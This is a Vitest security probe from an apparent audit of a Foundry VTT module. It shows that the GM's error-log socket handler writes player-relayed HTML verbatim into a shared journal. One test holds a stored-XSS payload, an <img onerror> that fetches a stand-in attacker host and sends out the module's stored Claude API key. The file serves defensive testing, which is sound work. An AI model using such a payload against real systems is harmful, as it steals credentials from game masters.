/**
 * PROBE — MP-04 ERRORLOG-RELAY-RAW-HTML (ninth audit, area multiplayer)
 *
 * What the user does: a player's browser emits `errorLog.append` on the module
 * socket — the message a player's client sends the canonical GM so the
 * player's module warnings reach the shared "Starforged Companion — Error
 * Log" journal. An honest client sends `formatEntry`'s output (escaped text in
 * a `<p>`). A console, a macro or a mis-formatted client sends whatever it
 * likes as `html`.
 *
 * What happens: registerErrorLogSocket (src/logging/errorLog.js:151–164)
 * checks only that `html` is a non-empty string, attributes it (the user name
 * IS stripped of `&<>`, :138–144) and appends the string verbatim to the GM's
 * journal page (`enqueue` → `doWrite`, :106). A relayed payload is written
 * into a GM-owned document as live HTML: a `<img onerror>` / `<script>` lands
 * in the Error Log every GM opens.
 *
 * What should happen: rules/reachability.md §8 — a relayed payload is
 * client-asserted, so the handler re-validates it and bounds it to what the
 * UI could have produced. The UI produces `[timestamp] LEVEL: escaped text`;
 * the handler should accept structured fields ({ level, message }) and format
 * them with `formatEntry` on the GM, or at least re-escape anything that is
 * not one of its own `<p>…</p>` entries, so no relayed markup is persisted.
 *
 * Controls: an honest relayed entry is written and attributed to the player;
 * a forged user name is stripped of markup (today's partial guard).
 *
 * (Foundry) whether Foundry's journal renderer sanitises the stored markup is
 * Foundry's; the defect is the GM document holding relayed raw HTML at all.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";

vi.mock("../../../src/multiplayer/gmGate.js", () => ({ isCanonicalGM: vi.fn(() => true) }));

import { registerErrorLogSocket, _reset } from "../../../src/logging/errorLog.js";

let origWarn, origError, handler, mockUpdate;

beforeEach(() => {
  origWarn = console.warn; origError = console.error;
  _reset(origWarn, origError);
  mockUpdate = vi.fn().mockResolvedValue({});
  const mockPage = { id: "p1", text: { content: "" }, update: mockUpdate };
  const mockJournal = { id: "j1", pages: { get: () => mockPage, contents: [mockPage] }, getName: () => null };
  vi.stubGlobal("game", {
    ready: true,
    user: { isGM: true },
    journal: { get: () => null, getName: () => mockJournal },
    socket: { on: (_evt, fn) => { handler = fn; } },
  });
  vi.stubGlobal("JournalEntry", { create: vi.fn().mockResolvedValue(mockJournal) });
  registerErrorLogSocket();
});
afterEach(() => { _reset(origWarn, origError); vi.unstubAllGlobals(); });

const written = () => mockUpdate.mock.calls.at(-1)?.[0]?.["text.content"] ?? "";

describe("MP-04 the GM bounds a relayed error-log entry to what the UI could send", () => {
  it("control: an honest relayed entry is written, attributed to the player", async () => {
    await handler({ kind: "errorLog.append", user: "Pat", html: "<p>[t] WARN: starforged-companion | audio: no key</p>\n" });
    await new Promise(r => setTimeout(r, 0));
    expect(written()).toContain("[t] (Pat) WARN: starforged-companion | audio: no key");
  });

  it("control: a forged user name is stripped of markup", async () => {
    await handler({ kind: "errorLog.append", user: "<b>Pat</b>", html: "<p>[t] WARN: x</p>\n" });
    await new Promise(r => setTimeout(r, 0));
    expect(written()).not.toMatch(/<b>/);
  });

  it("a relayed entry carrying markup is not persisted as live HTML in the GM's journal", async () => {
    const forged = '<p>[t] WARN: looks fine</p>\n<img src=x onerror="fetch(\'https://evil.example/?k=\'+game.settings.get(\'starforged-companion\',\'claudeApiKey\'))">';
    await handler({ kind: "errorLog.append", user: "Pat", html: forged });
    await new Promise(r => setTimeout(r, 0));
    // FAILS today: the payload's html is appended verbatim.
    expect.soft(written()).not.toMatch(/<img\b/i);
    expect.soft(written()).not.toMatch(/onerror=/i);
  });
});
